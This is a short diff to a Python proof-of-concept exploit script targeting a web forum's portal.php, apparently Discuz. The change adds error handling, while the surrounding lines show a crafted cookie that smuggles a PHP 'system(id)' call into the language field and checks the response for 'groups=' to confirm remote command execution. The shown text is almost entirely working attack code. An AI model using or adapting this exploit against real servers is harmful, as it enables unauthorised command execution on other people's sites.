@@ -17,7 +17,11 @@ def poc(url,eexec):
 	else:
 		url = 'http://'+url+'/portal.php'
 	urllib3.disable_warnings()	
-	sign = requests.get(url,verify=False).headers['Set-cookie'][:9]
+	try:
+		sign = requests.get(url,verify=False).headers['Set-cookie'][:9]
+	except:
+		print '%s not is vulnerable!' % flag
+		sys.exit()
 	cookie = "%s_saltkey=V2rU23EB;%s_language=en'.system(id).';%s_lastvisit=1562777028;%s=rrh6or;%s_lastact=1562780628%%09portal.php%%09;%s_sid=rrh6or" % (sign,sign,sign,sign,sign,sign)
 	res = requests.get(url,headers=headers,cookies={"Cookie":cookie},timeout=5,verify=False)
 	if 'groups=' not in res.text:
